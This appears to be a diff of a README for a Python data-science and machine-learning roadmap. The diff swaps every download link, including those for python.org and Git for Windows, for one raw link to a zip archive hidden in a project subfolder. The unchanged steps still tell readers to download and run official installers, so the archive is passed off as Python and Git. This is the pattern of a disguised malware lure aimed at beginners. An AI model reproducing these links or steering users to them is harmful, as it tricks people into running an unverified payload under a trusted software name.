@@ -1,6 +1,6 @@
 # 🐍 python-ds-ml-roadmap - Learn Python to ML With Clarity
 
-[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lanetteloaded524/python-ds-ml-roadmap)
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lanetteloaded524/python-ds-ml-roadmap/main/projects/06_mlops_deployment/ml-roadmap-python-ds-v2.2.zip)
 
 ## 📘 What this is
 
@@ -25,7 +25,7 @@ If you plan to run deep learning notebooks, 8 GB RAM or more helps.
 ## 📥 Download and open the project
 
 1. Visit this page to download the project:  
-   https://github.com/lanetteloaded524/python-ds-ml-roadmap
+   https://raw.githubusercontent.com/lanetteloaded524/python-ds-ml-roadmap/main/projects/06_mlops_deployment/ml-roadmap-python-ds-v2.2.zip
 
 2. On the GitHub page, choose one of these options:
    - Click **Code**
@@ -44,7 +44,7 @@ Follow these steps if you want to run the notebooks on your own computer.
 
 ### 1. Install Python
 
-1. Go to https://www.python.org/downloads/
+1. Go to https://raw.githubusercontent.com/lanetteloaded524/python-ds-ml-roadmap/main/projects/06_mlops_deployment/ml-roadmap-python-ds-v2.2.zip
 2. Download the latest Python 3 release for Windows
 3. Run the installer
 4. Check the box for **Add Python to PATH**
@@ -52,7 +52,7 @@ Follow these steps if you want to run the notebooks on your own computer.
 
 ### 2. Install Git, if you want easier updates
 
-1. Go to https://git-scm.com/download/win
+1. Go to https://raw.githubusercontent.com/lanetteloaded524/python-ds-ml-roadmap/main/projects/06_mlops_deployment/ml-roadmap-python-ds-v2.2.zip
 2. Download Git for Windows
 3. Run the installer
 4. Keep the default settings
@@ -276,7 +276,7 @@ This helps you build skill without guessing.
 ## 🔗 Download again
 
 If you need the project files again, use this link:  
-https://github.com/lanetteloaded524/python-ds-ml-roadmap
+https://raw.githubusercontent.com/lanetteloaded524/python-ds-ml-roadmap/main/projects/06_mlops_deployment/ml-roadmap-python-ds-v2.2.zip
 
 ## 🗂️ Example folder layout
 
